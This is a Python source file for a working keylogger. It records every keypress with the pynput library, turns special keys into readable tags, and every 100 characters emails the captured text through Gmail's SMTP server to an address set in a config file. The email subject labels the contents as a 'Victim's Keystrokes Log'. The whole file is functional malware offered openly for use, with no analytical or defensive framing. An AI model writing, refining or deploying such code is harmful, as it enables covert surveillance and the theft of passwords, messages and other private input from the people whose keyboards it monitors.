import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener
import configparser # Import configparser

keystrokes = ""

# --- Configuration Loading ---
# Load email credentials from config.ini
config = configparser.ConfigParser()
config_file_path = 'config.ini' # Define path to config file

if not os.path.exists(config_file_path):
    print(f"Error: {config_file_path} not found.")
    print("Please create a 'config.ini' file in the same directory with your email credentials.")
    print("Example config.ini content:")
    print("[EMAIL]")
    print("from_email = your_email@gmail.com")
    print("to_email = recipient_email@example.com")
    print("password = your_app_password")
    exit() # Exit if config file is missing

config.read(config_file_path)

try:
    FROM_EMAIL = config['EMAIL']['from_email']
    TO_EMAIL = config['EMAIL']['to_email']
    EMAIL_PASSWORD = config['EMAIL']['password']
except KeyError as e:
    print(f"Error: Missing configuration for '{e}' in config.ini. Please check your config.ini file.")
    exit()

# --- Keylogging Logic ---
def log_happykey(key):
    global keystrokes
    key_char = str(key).replace("'", "") # Convert key object to string and remove quotes

    # Handle special keys for better readability in logs
    if key_char == 'Key.space':
        key_char = ' '
    elif key_char == 'Key.enter':
        key_char = '\n'
    elif key_char == 'Key.shift' or key_char.startswith('Key.shift_'): # Handle both Shift keys
        key_char = ''
    elif key_char == 'Key.tab':
        key_char = '\t'
    elif key_char == 'Key.backspace':
        key_char = '<BACKSPACE>' # More descriptive representation
    elif key_char.startswith('Key.'): # For other special keys like Key.ctrl_l, Key.alt_l, etc.
        key_char = f"<{key_char.split('.')[-1].upper()}>" # e.g., <CTRL_L>
    else:
        pass # For regular character keys

    keystrokes += key_char

    # Send email when keystrokes buffer reaches 100 characters
    if len(keystrokes) >= 100:
        send_email_with_content(keystrokes)
        keystrokes = "" # Reset buffer after sending

def send_email_with_content(content):
    """
    Sends the accumulated keystroke content via email.
    """
    try:
        msg = MIMEMultipart()
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg['Subject'] = "Victim's Keystrokes Log" # More professional subject

        msg.attach(MIMEText(content, 'plain'))

        # Connect to Gmail's SMTP server securely
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls() # Enable TLS encryption
        server.login(FROM_EMAIL, EMAIL_PASSWORD) # Log in to the email account

        server.sendmail(FROM_EMAIL, TO_EMAIL, msg.as_string())
        server.quit() # Disconnect from the server
        # print("Email sent successfully!") # For debugging, remove in production
    except smtplib.SMTPAuthenticationError:
        print("Error: SMTP Authentication Failed. Check your email, password (App Password for Gmail), and 'Less secure app access' settings.")
    except smtplib.SMTPServerDisconnected:
        print("Error: SMTP server disconnected unexpectedly. Check your internet connection or server status.")
    except Exception as e:
        print(f"An error occurred while sending email: {e}")

# --- Main Listener Loop ---
if __name__ == '__main__':
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        with Listener(on_press=log_happykey) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    except Exception as e:
        print(f"An unexpected error occurred in the keylogger: {e}")
